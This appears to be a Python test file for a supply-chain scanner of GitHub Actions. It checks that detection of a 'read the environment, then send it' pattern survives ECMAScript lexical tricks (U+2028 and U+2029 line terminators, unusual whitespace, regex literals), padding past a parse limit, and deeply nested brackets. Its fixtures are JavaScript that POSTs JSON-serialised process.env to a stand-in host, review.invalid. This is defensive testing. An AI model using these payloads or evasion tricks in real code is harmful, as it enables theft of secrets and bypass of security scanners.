"""FP-GITHUB-SCRIPT (0.1.9), the review of Oct 20 (HIGH 1): ECMAScript's line terminators and white space. U+2028
and U+2029 end a line as LF and CR do (a line comment, a regular expression literal, a line to ASI), and NBSP, U+FEFF
and every Zs separate tokens; both body readers read them so, and a decision that rests on a character they do not
model is a guess. The review's case: `debugger`, then U+2028, then `/}/.test(s)` was read as a name and a division by
both readers, which agreed on the regular expression's `}` as the function's end, and the narrowed payload lost its
send. test_fp_github_script_review.py holds the review of Oct 18.

Each case is checked through the text follower, the action scan past the supply-chain tree's limit, and the action
scan of a text the parser refuses (a valid prefix of 500 nested brackets): the text follower answers in both.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.registry import repo
from lazaret.scanner import core
from tests.registry import _actions_support as fx

WHOLE = ("environment", "the whole environment", False)
HARVEST = "reads credentials or the whole environment and sends data over the network"
ACTION_YML = "name: x\nruns:\n  using: node24\n  main: dist/index.js\n"
CRITICAL = ("CRITICAL", "dist/index.js runs when the action runs (runs.main), and it " + HARVEST + ".")
PAST = "/*" + " pad" * 520000 + "*/\n"
NESTING = "const nesting=" + "[" * 500 + "0" + "]" * 500 + ";\n"
LS, PS, NBSP, BOM, IDEO = chr(0x2028), chr(0x2029), chr(0xA0), chr(0xFEFF), chr(0x3000)
SEND = "fetch('https://review.invalid/collect',{method:'POST',body:payload});"


def review_case(context):
    """The review's shape (sources/lexical-*.js): the read, `context`, the send, in one function."""
    return "function leak(s){const payload=JSON.stringify(process.env);" + context + SEND + "}\nleak('x');"


CASES = {}
for sep, label in ((LS, "U+2028"), (PS, "U+2029"), ("\r", "CR"), ("\n", "LF")):
    CASES[f"debugger, then {label}"] = review_case("debugger" + sep + "/}/.test(s);")
    CASES[f"break, then {label}"] = review_case("while(false){break" + sep + "/}/.test(s);}")
    CASES[f"a line comment {label} ends"] = review_case("// a note" + sep + "if (s) { s = s + 1; }\n")
for ws, label in ((NBSP, "NBSP"), (BOM, "U+FEFF"), (IDEO, "U+3000")):
    CASES[f"a labeled break after {label}"] = review_case("lbl: for (;;) { break" + ws + "lbl\n/}/.test(s); }\n")
CASES["a labeled break after a comment"] = review_case("lbl: for (;;) { break /* c */ lbl\n/}/.test(s); }\n")
CASES["a spread's regular expression"] = review_case("const r = [.../}/.exec(s) || []];\n")


def sent(text):
    got = core.local_data_sent_at(text)
    return None if got is None else tuple(got[1:])


def action_risks(js):
    res = repo.scan_action(fx.archive("o/r", "0" * 40, {"action.yml": ACTION_YML, "dist/index.js": js}), "")
    return [(i["sev"], i["msg"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]


class LineTerminatorTests(unittest.TestCase):
    def test_the_follower_keeps_the_send(self):
        for what, text in CASES.items():
            with self.subTest(what):
                self.assertEqual(sent(text), WHOLE)

    def test_the_action_scan_past_the_trees_limit(self):
        for what, text in CASES.items():
            if "U+20" in what or "labeled" in what:
                with self.subTest(what):
                    self.assertEqual(action_risks(text + PAST), [CRITICAL])

    def test_the_action_scan_of_a_text_the_parser_refuses(self):
        for what, text in CASES.items():
            with self.subTest(what):
                self.assertIsNotNone(core.js_refusal(NESTING + text))
                self.assertIn(CRITICAL, action_risks(NESTING + text))


if __name__ == "__main__":
    unittest.main()
